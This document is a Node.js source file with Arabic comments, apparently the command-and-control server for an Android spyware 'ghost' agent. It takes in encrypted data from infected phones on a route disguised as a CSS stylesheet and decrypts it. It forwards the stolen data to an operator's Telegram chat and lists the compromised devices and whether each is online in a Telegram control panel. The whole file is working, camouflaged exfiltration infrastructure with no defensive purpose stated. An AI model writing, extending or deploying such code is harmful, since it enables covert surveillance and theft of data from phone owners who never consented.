// app.js - إطار الإدارة والتحكم الشبح المتكامل بالأزرار (2026)
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;
const ENCRYPTION_SECRET = process.env.AGENT_SECRET || 'BaseSystemZeroDaySecureKey2026';

if (!token || !chatId) {
    console.error('[-] خطأ: لم يتم ضبط متغيرات البيئة للتوكن أو المعرف بشكل صحيح.');
    process.exit(1);
}

const app = express();
const appBot = new telegramBot(token, { polling: true });

// قاعدة بيانات ديناميكية في الذاكرة العشوائية لإدارة نبضات الأجهزة المتصلة
const appClients = new Map();

app.use(express.text({ type: '*/*', limit: '50mb' }));

// اشتقاق مفتاح التشفير العسكري في الذاكرة العشوائية لمنع تتبعه
const CRYPTO_KEY = crypto.scryptSync(ENCRYPTION_SECRET, 'system_salt', 32);

// --- موديول فك التشفير المتقدم (AES-256-GCM) ---
function decryptPayload(base64String) {
    try {
        const rawJson = Buffer.from(base64String, 'base64').toString('utf8');
        const packet = JSON.parse(rawJson);
        const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, Buffer.from(packet.v, 'hex'));
        decipher.setAuthTag(Buffer.from(packet.g, 'hex'));
        let decrypted = decipher.update(packet.d, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

// --- مسار التمويه الشبكي المستقر المتوافق مع Render ---
app.post('/assets/web/style-min.css', async (req, res) => {
    try {
        const syncMode = req.headers['x-sync-mode'] || 'generic';
        const agentModel = req.headers['x-agent-model'] || 'Unknown-Device';
        const agentId = req.headers['x-agent-id'] || 'GhostAgent_AD';

        const decryptedRaw = decryptPayload(req.body);
        if (!decryptedRaw) return res.sendStatus(404);

        const payload = JSON.parse(decryptedRaw);

        // تسجيل وتحديث حالة الجهاز المتصل في الذاكرة العشوائية
        appClients.set(agentId, { model: agentModel, lastSeen: Date.now() });

        let telegramMessage = `📥 <b>بيانات واردة من: ${agentModel}</b>\n`;
        telegramMessage += `📊 النوع: <code>${syncMode}</code>\n\n`;
        telegramMessage += `<pre>${JSON.stringify(payload, null, 2)}</pre>`;

        await appBot.sendMessage(chatId, telegramMessage, { parse_mode: 'HTML' });
        res.status(200).send('/* Synchronized */');
    } catch (err) {
        res.sendStatus(200); 
    }
});

// ========================================================
// 📱 لوحة التحكم التفاعلية لبوت تليجرام (Telegram Interactivity)
// ========================================================
const mainKeyboard = {
    parse_mode: 'HTML',
    reply_markup: {
        keyboard: [['📱 الاجهزة المتصلة']],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// استقبال وقراءة رسائل تليجرام والرد الفوري بالأزرار
appBot.on('message', async (msg) => {
    const text = msg.text;
    const senderChatId = msg.chat.id;

    // جدار حماية لمنع المتطفلين من التحكم بالبوت الخاص بك
    if (String(senderChatId) !== String(chatId)) return;

    if (text === '/start' || text === 'تفعيل' || text === 'hello') {
        await appBot.sendMessage(chatId, '⚙️ <b>تم تشغيل وتفعيل لوحة تحكم النظام الشبح بنجاح.</b>\n\nبانتظار وصول الحزم المشفرة ونبضات العميل الأندرويد...', mainKeyboard);
    } 
    else if (text === '📱 الاجهزة المتصلة') {
        if (appClients.size === 0) {
            await appBot.sendMessage(chatId, '📭 <b>لا توجد أجهزة متصلة بالخادم حالياً.</b>\n\nقم بتشغيل وتثبيت تطبيق الأندرويد لتبدأ النبضات بالظهور هنا.', mainKeyboard);
        } else {
            let reply = '<b>👥 الأجهزة والأنودات النشطة في الذاكرة:</b>\n\n';
            appClients.forEach((client, id) => {
                const status = (Date.now() - client.lastSeen < 45000) ? '🟢 ONLINE' : '⚫ SLEEPING';
                reply += `• 📱 <b>الموديل:</b> ${client.model}\n🆔 <b>ID:</b> <code>${id}</code>\n📊 <b>الحالة:</b> ${status}\n\n`;
            });
            await appBot.sendMessage(chatId, reply, mainKeyboard);
        }
    }
});

app.get('/', (req, res) => res.status(200).send('Service Active'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] خادم الإدارة الشبح يعمل الآن على المنفذ: ${PORT}`);
});
